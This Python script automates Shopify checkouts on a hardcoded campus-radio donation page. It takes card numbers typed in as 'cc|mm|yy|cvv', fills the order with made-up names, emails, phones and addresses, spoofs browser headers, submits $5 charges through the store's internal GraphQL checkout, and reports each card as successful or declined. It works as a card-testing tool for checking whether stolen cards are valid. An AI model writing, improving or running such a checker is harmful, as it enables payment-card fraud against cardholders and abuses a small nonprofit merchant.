import asyncio
import random
import re
import json
import html
from urllib.parse import urlparse, quote
import sys
import httpx
from bs4 import BeautifulSoup
from fake_useragent import UserAgent

try:
    sys.stdout.reconfigure(encoding='utf-8')
except AttributeError:
    pass 

def find_between(s, start, end):
    try:
        if start in s and end in s:
            return (s.split(start))[1].split(end)[0]
        return ""
    except:
        return ""

class ShopifyAuto:
    def __init__(self):
        self.user_agent = UserAgent().random
        self.last_price = None
    
    async def get_random_info(self):
        """Get random user info with VALID addresses"""
        us_addresses = [
            {"add1": "64 North 9th Street", "city": "Brooklyn", "state": "New York", "state_short": "NY", "zip": "11249"},
            {"add1": "123 Main St", "city": "Portland", "state": "Maine", "state_short": "ME", "zip": "04101"},
            {"add1": "456 Oak Ave", "city": "Portland", "state": "Maine", "state_short": "ME", "zip": "04102"},
            {"add1": "789 Pine Rd", "city": "Portland", "state": "Maine", "state_short": "ME", "zip": "04103"},
            {"add1": "321 Elm St", "city": "Bangor", "state": "Maine", "state_short": "ME", "zip": "04401"},
        ]
        
        address = random.choice(us_addresses)
        first_name = random.choice(["John", "Emily", "Alex", "Sarah", "Michael", "Jessica", "David", "Lisa", "jack"])
        last_name = random.choice(["Smith", "Johnson", "Williams", "Brown", "Garcia", "Miller", "Davis", "jack"])
        email = f"{first_name.lower()}.{last_name.lower()}{random.randint(1, 999)}@gmail.com"
        
        valid_phones = [
            "2025550199", "3105551234", "4155559876", "6175550123",
            "9718081573", "2125559999", "7735551212", "4085556789"
        ]
        phone = random.choice(valid_phones)
        
        return {
            "fname": first_name,
            "lname": last_name,
            "email": email,
            "phone": phone,
            "add1": address["add1"],
            "city": address["city"],
            "state": address["state"],
            "state_short": address["state_short"],
            "zip": address["zip"]
        }

async def main():
    async with httpx.AsyncClient(follow_redirects=True, timeout=30.0) as session:
        try:
            # Site hardcoded
            site = 'https://cfrc-radio-queens-university.myshopify.com'
            print(f"Using Shopify domain: {site}")
            
            card_input = input('Enter card number (cc|mm|yy|cvv): ').strip()
            try:
                cc, mon, year, cvv = card_input.split('|')
                if len(year) == 2:
                    year = f"20{year}"
            except ValueError:
                print("❌ Invalid card format. Using placeholders.")
                cc, mon, year, cvv = "0000000000000000", "01", "2025", "123"
            
            shop = ShopifyAuto()
            
            # Hardcoded product info
            product_handle = 'donate'
            variant_id = "51534919500052"
            product_id = "8067087532308"
            price = "5.00"
            
            print(f"\n ✅ Using variant ID: {variant_id}")
            print(f" ✅ Product ID: {product_id}")
            print(f" ✅ Price: ${price}")
            
            await process_checkout(session, site, variant_id, product_id, price, cc, mon, year, cvv, shop, product_handle)
                
        except Exception as e:
            print(f"❌ An error occurred in main: {e}")

async def process_checkout(session, site, variant_id, product_id, price, cc, mon, year, cvv, shop, product_handle):
    """Process the complete checkout flow including payment"""
    
    headers = {
        'User-Agent': shop.user_agent,
        'Accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8',
    }
    
    print("\n Visiting cart page...")
    cart_response = await session.get(f"{site}/cart", headers=headers)
    print(f" Cart page status: {cart_response.status_code}")
    
    print("\n Adding item to cart...")
    
    add_headers = {
        'Host': urlparse(site).netloc,
        'Accept': 'application/json',
        'Accept-Language': 'en-GB,en;q=0.9',
        'Content-Type': 'application/json',
        'Origin': site,
        'Referer': f"{site}/products/{product_handle}",
        'User-Agent': shop.user_agent,
        'X-Requested-With': 'XMLHttpRequest',
    }
    
    add_data = {
        'id': str(variant_id),
        'quantity': 1,
        'form_type': 'product'
    }
    
    response = await session.post(
        f"{site}/cart/add.js",
        headers=add_headers,
        json=add_data
    )
    
    print(f" Add to cart response: {response.status_code}")
    
    if response.status_code == 200:
        print(" ✅ Item added to cart!")
        
        cart_data_response = await session.get(f"{site}/cart.js", headers=headers)
        if cart_data_response.status_code == 200:
            cart_data = cart_data_response.json()
            token = cart_data.get('token')
            print(f" Cart token: {token}")
            
            print("\n Updating cart with sections...")
            
            change_headers = {
                'Host': urlparse(site).netloc,
                'Accept': 'application/json',
                'Accept-Language': 'en-GB,en;q=0.9',
                'Content-Type': 'application/json',
                'Origin': site,
                'Referer': f"{site}/cart",
                'User-Agent': shop.user_agent,
                'X-Requested-With': 'XMLHttpRequest',
            }
            
            change_data = {
                "line": "1",
                "quantity": "1",
                "sections": [
                    "template--17191094321428__cart-items",
                    "cart-icon-bubble",
                    "cart-live-region-text",
                    "template--17191094321428__cart-footer"
                ],
                "sections_url": "/cart"
            }
            
            change_response = await session.post(
                f"{site}/cart/change.js",
                headers=change_headers,
                json=change_data
            )
            
            print(f" Cart change response: {change_response.status_code}")
            
            if change_response.status_code == 200:
                print(" ✅ Cart updated successfully!")
                
                print("\n Proceeding to checkout...")
                
                checkout_headers = {
                    'User-Agent': shop.user_agent,
                    'Accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8',
                    'Referer': f"{site}/cart",
                }
                
                checkout_response = await session.get(f"{site}/checkout", headers=checkout_headers)
                print(f" Checkout page status: {checkout_response.status_code}")
                
                if checkout_response.status_code == 200:
                    response_text = checkout_response.text
                    
                    session_token_match = re.search(r'name="serialized-sessionToken"\s+content="&quot;([^"]+)&quot;"', response_text)
                    session_token = None
                    if session_token_match:
                        session_token = session_token_match.group(1)
                        print(f" ✅ Session token found")
                    
                    queue_token = find_between(response_text, 'queueToken&quot;:&quot;', '&quot;')
                    stable_id = find_between(response_text, 'stableId&quot;:&quot;', '&quot;')
                    paymentMethodIdentifier = find_between(response_text, 'paymentMethodIdentifier&quot;:&quot;', '&quot;')
                    
                    print(f" Queue token: {queue_token}")
                    print(f" Stable ID: {stable_id}")
                    print(f" Payment Method Identifier: {paymentMethodIdentifier}")
                    
                    random_info = await shop.get_random_info()
                    fname = random_info["fname"]
                    lname = random_info["lname"]
                    email = random_info["email"]
                    phone = random_info["phone"]
                    add1 = random_info["add1"]
                    city = random_info["city"]
                    state_short = random_info["state_short"]
                    zip_code = str(random_info["zip"])
                    
                    print(f"\n Using address: {add1}, {city}, {state_short} {zip_code}")
                    
                    print("\n Creating payment session...")
                    
                    session_endpoints = [
                        "https://deposit.us.shopifycs.com/sessions",
                        "https://checkout.shopifycs.com/sessions"
                    ]
                    
                    session_created = False
                    sessionid = None
                    
                    for endpoint in session_endpoints:
                        try:
                            print(f" Trying payment session endpoint: {endpoint}")
                            payment_headers = {
                                'authority': urlparse(endpoint).netloc,
                                'accept': 'application/json',
                                'content-type': 'application/json',
                                'origin': 'https://checkout.shopifycs.com',
                                'referer': 'https://checkout.shopifycs.com/',
                                'user-agent': shop.user_agent,
                            }
                            
                            json_data = {
                                'credit_card': {
                                    'number': cc.replace(' ', ''),
                                    'month': str(mon),
                                    'year': str(year),
                                    'verification_value': str(cvv),
                                    'name': f"{fname} {lname}",
                                },
                                'payment_session_scope': urlparse(site).netloc,
                            }
                            
                            session_response = await session.post(endpoint, headers=payment_headers, json=json_data)
                            print(f" Payment Session Response Status: {session_response.status_code}")
                            
                            if session_response.status_code == 200:
                                session_data = session_response.json()
                                if "id" in session_data:
                                    sessionid = session_data["id"]
                                    session_created = True
                                    print(f"✅ Payment session created: {sessionid}")
                                    break
                            else:
                                print(f" Response: {session_response.text}")
                        except Exception as e:
                            print(f"⚠️ Error trying {endpoint}: {e}")
                    
                    if session_created:
                        print("\n Submitting payment via GraphQL...")
                        
                        # GraphQL persisted endpoint
                        graphql_url = f"{site}/checkouts/internal/graphql/persisted?operationName=SubmitForCompletion"
                        
                        graphql_headers = {
                            'host': urlparse(site).netloc,
                            'accept': 'application/json',
                            'accept-language': 'en-CA',
                            'content-type': 'application/json',
                            'origin': site,
                            'priority': 'u=1, i',
                            'referer': f"{site}/checkouts/cn/{token}/en-ca/?_r=AQAB8eQzLAJORIJO9Qt6aUMgPsNuG8N4npTMqt3VVnxP6xY",
                            'sec-ch-ua': '"Not:A-Brand";v="99", "Brave";v="145", "Chromium";v="145"',
                            'sec-ch-ua-mobile': '?0',
                            'sec-ch-ua-platform': '"Windows"',
                            'sec-fetch-dest': 'empty',
                            'sec-fetch-mode': 'cors',
                            'sec-fetch-site': 'same-origin',
                            'sec-gpc': '1',
                            'shopify-checkout-client': 'checkout-web/1.0',
                            'shopify-checkout-source': f'id="{token}", type="cn"',
                            'user-agent': shop.user_agent,
                            'x-checkout-one-session-token': session_token,
                            'x-checkout-web-deploy-stage': 'production',
                            'x-checkout-web-server-handling': 'fast',
                            'x-checkout-web-server-rendering': 'yes',
                            'x-checkout-web-source-id': token,
                        }
                        
                        # Generate random page ID
                        random_page_id = f"{random.randint(10000000, 99999999):08x}-{random.randint(1000, 9999):04X}-{random.randint(1000, 9999):04X}-{random.randint(1000, 9999):04X}-{random.randint(100000000000, 999999999999):012X}".upper()
                        
                        # Create payload structure
                        graphql_payload = {
                            "variables": {
                                "input": {
                                    "sessionInput": {
                                        "sessionToken": session_token
                                    },
                                    "queueToken": queue_token,
                                    "discounts": {
                                        "lines": [],
                                        "acceptUnexpectedDiscounts": True
                                    },
                                    "delivery": {
                                        "deliveryLines": [
                                            {
                                                "selectedDeliveryStrategy": {
                                                    "deliveryStrategyMatchingConditions": {
                                                        "estimatedTimeInTransit": {"any": True},
                                                        "shipments": {"any": True}
                                                    },
                                                    "options": {}
                                                },
                                                "targetMerchandiseLines": {
                                                    "lines": [{"stableId": stable_id}]
                                                },
                                                "deliveryMethodTypes": ["NONE"],
                                                "expectedTotalPrice": {"any": True},
                                                "destinationChanged": True
                                            }
                                        ],
                                        "noDeliveryRequired": [],
                                        "useProgressiveRates": False,
                                        "prefetchShippingRatesStrategy": None,
                                        "supportsSplitShipping": True
                                    },
                                    "deliveryExpectations": {
                                        "deliveryExpectationLines": []
                                    },
                                    "merchandise": {
                                        "merchandiseLines": [
                                            {
                                                "stableId": stable_id,
                                                "merchandise": {
                                                    "productVariantReference": {
                                                        "id": f"gid://shopify/ProductVariantMerchandise/{variant_id}",
                                                        "variantId": f"gid://shopify/ProductVariant/{variant_id}",
                                                        "properties": [],
                                                        "sellingPlanId": None,
                                                        "sellingPlanDigest": None
                                                    }
                                                },
                                                "quantity": {"items": {"value": 1}},
                                                "expectedTotalPrice": {
                                                    "value": {
                                                        "amount": price,
                                                        "currencyCode": "CAD"
                                                    }
                                                },
                                                "lineComponentsSource": None,
                                                "lineComponents": []
                                            }
                                        ]
                                    },
                                    "memberships": {
                                        "memberships": []
                                    },
                                    "payment": {
                                        "totalAmount": {"any": True},
                                        "paymentLines": [
                                            {
                                                "paymentMethod": {
                                                    "directPaymentMethod": {
                                                        "paymentMethodIdentifier": paymentMethodIdentifier,
                                                        "sessionId": sessionid,
                                                        "billingAddress": {
                                                            "streetAddress": {
                                                                "address1": add1,
                                                                "address2": "",
                                                                "city": city,
                                                                "countryCode": "US",
                                                                "postalCode": zip_code,
                                                                "lastName": lname,
                                                                "firstName": fname,
                                                                "zoneCode": state_short,
                                                                "phone": phone
                                                            }
                                                        },
                                                        "cardSource": None
                                                    },
                                                    "giftCardPaymentMethod": None,
                                                    "redeemablePaymentMethod": None,
                                                    "walletPaymentMethod": None,
                                                    "walletsPlatformPaymentMethod": None,
                                                    "localPaymentMethod": None,
                                                    "paymentOnDeliveryMethod": None,
                                                    "paymentOnDeliveryMethod2": None,
                                                    "manualPaymentMethod": None,
                                                    "customPaymentMethod": None,
                                                    "offsitePaymentMethod": None,
                                                    "customOnsitePaymentMethod": None,
                                                    "deferredPaymentMethod": None,
                                                    "customerCreditCardPaymentMethod": None,
                                                    "paypalBillingAgreementPaymentMethod": None,
                                                    "remotePaymentInstrument": None
                                                },
                                                "amount": {
                                                    "value": {
                                                        "amount": price,
                                                        "currencyCode": "CAD"
                                                    }
                                                }
                                            }
                                        ],
                                        "billingAddress": {
                                            "streetAddress": {
                                                "address1": add1,
                                                "address2": "",
                                                "city": city,
                                                "countryCode": "US",
                                                "postalCode": zip_code,
                                                "lastName": lname,
                                                "firstName": fname,
                                                "zoneCode": state_short,
                                                "phone": phone
                                            }
                                        }
                                    },
                                    "buyerIdentity": {
                                        "customer": {
                                            "presentmentCurrency": "CAD",
                                            "countryCode": "CA"
                                        },
                                        "email": email,
                                        "emailChanged": False,
                                        "phoneCountryCode": "CA",
                                        "marketingConsent": [],
                                        "shopPayOptInPhone": {
                                            "number": "",
                                            "countryCode": "CA"
                                        },
                                        "rememberMe": False
                                    },
                                    "tip": {
                                        "tipLines": []
                                    },
                                    "taxes": {
                                        "proposedAllocations": None,
                                        "proposedTotalAmount": {
                                            "value": {
                                                "amount": "0",
                                                "currencyCode": "CAD"
                                            }
                                        },
                                        "proposedTotalIncludedAmount": None,
                                        "proposedMixedStateTotalAmount": None,
                                        "proposedExemptions": []
                                    },
                                    "note": {
                                        "message": None,
                                        "customAttributes": []
                                    },
                                    "localizationExtension": {
                                        "fields": []
                                    },
                                    "shopPayArtifact": {
                                        "optIn": {
                                            "vaultEmail": "",
                                            "vaultPhone": "",
                                            "optInSource": "REMEMBER_ME"
                                        }
                                    },
                                    "nonNegotiableTerms": None,
                                    "scriptFingerprint": {
                                        "signature": None,
                                        "signatureUuid": None,
                                        "lineItemScriptChanges": [],
                                        "paymentScriptChanges": [],
                                        "shippingScriptChanges": []
                                    },
                                    "optionalDuties": {
                                        "buyerRefusesDuties": False
                                    },
                                    "cartMetafields": []
                                },
                                "attemptToken": f"{token}-{random.randint(1000, 9999)}",
                                "metafields": [],
                                "analytics": {
                                    "requestUrl": f"{site}/checkouts/cn/{token}/en-ca/?_r=AQAB8eQzLAJORIJO9Qt6aUMgPsNuG8N4npTMqt3VVnxP6xY",
                                    "pageId": random_page_id
                                }
                            },
                            "operationName": "SubmitForCompletion",
                            "id": "d50b365913d0a33a1d8905bfe5d0ecded1a633cb6636cbed743999cfacefa8cb"
                        }
                        
                        try:
                            graphql_response = await session.post(graphql_url, headers=graphql_headers, json=graphql_payload)
                            print(f" GraphQL Response Status: {graphql_response.status_code}")
                            
                            if graphql_response.status_code == 200:
                                result_data = graphql_response.json()
                                print(f"\n Initial Response: {json.dumps(result_data, indent=2)[:500]}...")
                                
                                # Check the response type
                                if 'data' in result_data:
                                    completion = result_data['data'].get('submitForCompletion', {})
                                    
                                    if completion.get('receipt'):
                                        receipt = completion['receipt']
                                        receipt_type = receipt.get('__typename')
                                        receipt_id = receipt.get('id')
                                        
                                        if receipt_type == 'ProcessedReceipt':
                                            # Payment successful immediately
                                            print(f"\n✅✅✅ PAYMENT SUCCESSFUL! ✅✅✅")
                                            print(f" Receipt ID: {receipt_id}")
                                            if receipt.get('redirectUrl'):
                                                print(f" Redirect URL: {receipt['redirectUrl']}")
                                            return
                                            
                                        elif receipt_type == 'ProcessingReceipt':
                                            # Payment is processing - need to poll
                                            poll_delay = receipt.get('pollDelay', 2)
                                            print(f"\n⏳ Payment processing. Waiting {poll_delay} seconds before polling...")
                                            
                                            # Poll for receipt status
                                            await poll_for_receipt(session, site, receipt_id, session_token, token, shop)
                                            return
                                            
                                        elif receipt_type == 'FailedReceipt':
                                            # Payment failed immediately
                                            error = receipt.get('processingError', {})
                                            print(f"\n❌ Payment failed: {error.get('code', 'UNKNOWN_ERROR')} - {error.get('messageUntranslated', '')}")
                                            return
                                    
                                    elif completion.get('__typename') == 'Throttled':
                                        print("\n⚠️ Payment throttled. Will retry...")
                                        await asyncio.sleep(5)
                                        # Could implement retry logic here
                                    
                                    elif completion.get('errors'):
                                        errors = completion.get('errors', [])
                                        print(f"\n❌ Payment rejected: {[e.get('code') for e in errors]}")
                                        
                                elif 'errors' in result_data:
                                    print(f"\n❌ GraphQL errors: {result_data['errors']}")
                            else:
                                print(f"❌ GraphQL request failed: {graphql_response.text}")
                                
                        except Exception as e:
                            print(f"❌ Error during payment submission: {e}")

async def poll_for_receipt(session, site, receipt_id, session_token, token, shop):
    """Poll for receipt status until we get a final result"""
    print("\n🔄 Polling for receipt status...")
    
    # Encode the receipt ID for URL
    if receipt_id.startswith('gid://'):
        receipt_id_encoded = quote(receipt_id, safe='')
    else:
        receipt_id_encoded = quote(f"gid://shopify/ProcessedReceipt/{receipt_id}", safe='')
    
    poll_url = f"{site}/checkouts/internal/graphql/persisted?operationName=PollForReceipt&variables=%7B%22receiptId%22%3A%22{receipt_id_encoded}%22%2C%22sessionToken%22%3A%22{session_token}%22%7D&id=baa45c97a49dae99440b5f8a954dfb31b01b7af373f5335204c29849f3397502"
    
    poll_headers = {
        'host': urlparse(site).netloc,
        'accept': 'application/json',
        'accept-language': 'en-CA',
        'content-type': 'application/json',
        'priority': 'u=1, i',
        'referer': f"{site}/checkouts/cn/{token}/en-ca/?_r=AQAB8eQzLAJORIJO9Qt6aUMgPsNuG8N4npTMqt3VVnxP6xY",
        'sec-ch-ua': '"Not:A-Brand";v="99", "Brave";v="145", "Chromium";v="145"',
        'sec-ch-ua-mobile': '?0',
        'sec-ch-ua-platform': '"Windows"',
        'sec-fetch-dest': 'empty',
        'sec-fetch-mode': 'cors',
        'sec-fetch-site': 'same-origin',
        'sec-gpc': '1',
        'shopify-checkout-client': 'checkout-web/1.0',
        'shopify-checkout-source': f'id="{token}", type="cn"',
        'user-agent': shop.user_agent,
        'x-checkout-one-session-token': session_token,
        'x-checkout-web-deploy-stage': 'production',
        'x-checkout-web-server-handling': 'fast',
        'x-checkout-web-server-rendering': 'yes',
        'x-checkout-web-source-id': token,
    }
    
    max_polls = 30  # Maximum number of polling attempts
    poll_count = 0
    
    while poll_count < max_polls:
        try:
            poll_count += 1
            print(f" Poll attempt {poll_count}/{max_polls}...")
            
            poll_response = await session.get(poll_url, headers=poll_headers)
            
            if poll_response.status_code == 200:
                poll_data = poll_response.json()
                
                if 'data' in poll_data and 'receipt' in poll_data['data']:
                    receipt = poll_data['data']['receipt']
                    receipt_type = receipt.get('__typename')
                    
                    if receipt_type == 'ProcessedReceipt':
                        # Payment successful!
                        print(f"\n✅✅✅ PAYMENT SUCCESSFUL! ✅✅✅")
                        print(f" Receipt ID: {receipt.get('id')}")
                        if receipt.get('redirectUrl'):
                            print(f" Redirect URL: {receipt['redirectUrl']}")
                        if receipt.get('orderIdentity'):
                            print(f" Order ID: {receipt['orderIdentity'].get('id')}")
                        return True
                        
                    elif receipt_type == 'FailedReceipt':
                        # Payment failed
                        error = receipt.get('processingError', {})
                        error_code = error.get('code', 'UNKNOWN_ERROR')
                        error_message = error.get('messageUntranslated', '')
                        print(f"\n❌ Card DECLINED: {error_code} - {error_message}")
                        
                        # Show card details if available
                        if error_code == 'GENERIC_ERROR':
                            print("   This usually means insufficient funds or card blocked")
                        return False
                        
                    elif receipt_type == 'ProcessingReceipt':
                        # Still processing - get next poll delay
                        poll_delay = receipt.get('pollDelay', 2)
                        print(f"   Still processing. Next poll in {poll_delay} seconds...")
                        await asyncio.sleep(poll_delay)
                        continue
                    
                    elif receipt_type == 'ActionRequiredReceipt':
                        print(f"\n⚠️ 3D Secure Required - Check browser manually")
                        return False
                
                elif 'errors' in poll_data:
                    print(f" Poll errors: {poll_data['errors']}")
                    # Don't break on errors, continue polling
                    await asyncio.sleep(3)
            
            else:
                print(f" Poll HTTP error: {poll_response.status_code}")
                await asyncio.sleep(3)
            
        except Exception as e:
            print(f" Poll error: {e}")
            await asyncio.sleep(3)
    
    print("\n⚠️ Polling timed out after 30 attempts - check manually")
    return False

if __name__ == "__main__":
    try:
        asyncio.run(main())
    except KeyboardInterrupt:
        print("\nInterrupted by user, exiting.")